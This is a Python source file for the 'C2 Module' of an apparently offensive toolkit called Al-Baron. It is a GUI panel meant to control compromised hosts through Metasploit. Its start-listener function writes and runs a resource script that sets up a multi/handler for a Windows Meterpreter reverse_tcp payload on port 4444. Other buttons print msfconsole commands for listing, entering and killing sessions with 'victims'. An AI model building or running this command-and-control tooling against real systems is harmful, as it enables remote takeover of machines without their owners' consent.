# language: Python, file: modules/c2.py
# Al-Baron C2 Module — control compromised hosts via Metasploit RPC
import customtkinter as ctk
import threading
import subprocess
import time
from core.executor import ToolExecutor

class C2Module:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "c2"
        self.executor = ToolExecutor(log_queue)
        self._parent = None
        self.out = None
        self.msf_proc = None
        self.session_list = []

    def render(self, parent):
        self._parent = parent
        ctk.CTkLabel(parent, text="C2 SERVER", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ffd700").pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(parent, text="Metasploit C2 · sessions · interactive shell", font=ctk.CTkFont(size=11), text_color="#8a8a8a").pack(pady=(0, 12), padx=24, anchor="w")

        # Controls
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=24, pady=12)
        for label, fn in [
            ("🚀 Start MSF Listener", self._start_listener),
            ("▸ List Sessions", self._list_sessions),
            ("⚡ Interact", self._interact),
            ("■ Kill All Sessions", self._kill_all),
        ]:
            ctk.CTkButton(row, text=label, width=180, height=34, fg_color="#2b2000", hover_color="#554400", text_color="#ffd700", command=fn).pack(side="left", padx=(0, 4))

        # Output
        ctk.CTkLabel(parent, text="Metasploit Console:", font=ctk.CTkFont(size=12, weight="bold"), text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(parent, fg_color="#05080c", text_color="#ffd700", font=ctk.CTkFont(family="Consolas", size=10), height=450)
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 24))

    def _start_listener(self):
        """يشغل msfconsole مع multi/handler جاهز"""
        self._safe_out("[*] Starting Metasploit multi/handler...")
        rc_script = """
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
"""
        with open("/tmp/msf_listener.rc", "w") as f:
            f.write(rc_script)

        cmd = ["x-terminal-emulator", "-e", "msfconsole -r /tmp/msf_listener.rc"]
        subprocess.Popen(cmd)
        self._safe_out("[+] Listener started in new window. Waiting for connections...")
        self._safe_out("[*] (To view sessions, click 'List Sessions' after a victim connects).")

    def _list_sessions(self):
        """يعرض الجلسات النشطة (محاكاة لأننا لا نستخدم RPC حالياً)"""
        self._safe_out("\n[*] To view sessions, switch to the msfconsole window and type: sessions -l")
        self._safe_out("[*] Or wait for a session to open, then use 'Interact'.")

    def _interact(self):
        self._safe_out("[*] Switch to the msfconsole window and type: sessions -i <ID>")

    def _kill_all(self):
        self._safe_out("[*] Switch to msfconsole and type: sessions -K")
        self._safe_out("[+] (This kills all active sessions).")

    def _safe_out(self, text):
        if not self._parent: return
        def _u():
            if self.out and self.out.winfo_exists():
                self.out.insert("end", text + "\n")
                self.out.see("end")
        self._parent.after(0, _u)
